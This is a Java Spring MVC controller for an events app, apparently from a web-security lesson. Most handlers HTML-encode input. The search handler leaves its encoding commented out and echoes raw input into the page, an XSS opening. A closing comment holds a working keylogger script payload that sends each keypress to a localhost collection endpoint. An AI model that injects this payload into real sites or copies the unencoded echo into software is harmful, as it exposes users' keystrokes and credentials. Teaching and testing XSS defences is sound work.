package com.shadsluiter.eventsapp.controllers;

import org.owasp.encoder.Encode;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.validation.BindingResult;
import org.springframework.web.bind.annotation.*;

import com.shadsluiter.eventsapp.models.EventModel;
import com.shadsluiter.eventsapp.models.EventSearch;
import com.shadsluiter.eventsapp.service.EventService;

import jakarta.validation.Valid;

import java.util.ArrayList;
import java.util.List;

@Controller
@RequestMapping("/events")
public class EventController {

    private final EventService eventService;

    @Autowired
    public EventController(EventService eventService) {
        this.eventService = eventService;
    }

    @GetMapping
    public String getAllEvents(Model model) {
        List<EventModel> events = eventService.findAll();
        model.addAttribute("events", events);
        model.addAttribute("message", "Showing all events");
        model.addAttribute("pageTitle", "Events");
        return "events";
    }

    @GetMapping("/create")
    public String showCreateEventForm(Model model) {
        model.addAttribute("event", new EventModel());
        model.addAttribute("pageTitle", "Create Event");
        return "create-event";
    }

    @PostMapping("/create")
    public String createEvent(@ModelAttribute @Valid EventModel event, BindingResult result, Model model) {
        if (result.hasErrors()) {
            model.addAttribute("pageTitle", "Create Event");
            return "create-event";
        }
        eventService.save(encodeEvent(event));
        return "redirect:/events";
    }

    @GetMapping("/edit/{id}")
    public String showEditEventForm(@PathVariable String id, Model model) {
        String eID = Encode.forHtml(id);

        EventModel event = eventService.findById(eID);
        model.addAttribute("event", event);
        return "edit-event";
    }

    @PostMapping("/edit/{id}")
    public String updateEvent(@PathVariable String id, @ModelAttribute EventModel event, Model model) {
        String eID = Encode.forHtml(id);

        EventModel updatedEvent = eventService.updateEvent(eID, event);
        model.addAttribute("event", updatedEvent);
        return "redirect:/events";
    }

    @GetMapping("/delete/{id}")
    public String deleteEvent(@PathVariable String id) {
        String s = Encode.forHtml(id);
        eventService.delete(s);
        return "redirect:/events";
    }

    // EventController.java (part of the existing file)
    @GetMapping("/search")
    public String searchForm(Model model) {
        model.addAttribute("eventSearch", new EventSearch());
        return "searchForm";
    }

    @PostMapping("/search")
    public String search(@ModelAttribute @Valid EventSearch eventSearch, BindingResult result, Model model) {
        if (result.hasErrors()) {
            return "searchForm";
        }
        //String s = encodeString(eventSearch.getSearchString());
        List<EventModel> events = eventService.findByDescription(eventSearch.getSearchString());
        model.addAttribute("message", "Search results for " + eventSearch.getSearchString());
        model.addAttribute("events", events);
        return "events";
    }

    private EventModel encodeEvent(EventModel event) {
        EventModel secure = new EventModel();

        secure.setDescription(encodeString(event.getDescription()));
        if (event.getId() != null)
            secure.setId(encodeString(event.getId()));
        secure.setLocation(encodeString(event.getLocation()));
        secure.setName(encodeString(event.getName()));
        secure.setOrganizerid(encodeString(event.getOrganizerid()));
        secure.setDate(event.getDate());

        return secure;
    }

    private String encodeString(String event) {

        return Encode.forHtml(event);
    }
}

/*
 * 
  <script>
  document.addEventListener(\'keypress\', function(evt) {
  var key = evt.key;
  if (key) {
  var param = encodeURIComponent(key);
  var url = "http://localhost:8081/logKey?key=" + param;
  
  fetch(url, {
  method: \'GET\'
  })
  .then(response => {
  if (!response.ok) {
  throw new Error(\'Network response was not ok\');
  }
  return response.text();
  })
  .then(data => {
  console.log(\'Key logged:\', data);
  })
  .catch(error => {
  console.error(\'There was a problem with the fetch operation:\', error);
  });
  }
  });
  
  </script>
  
 */
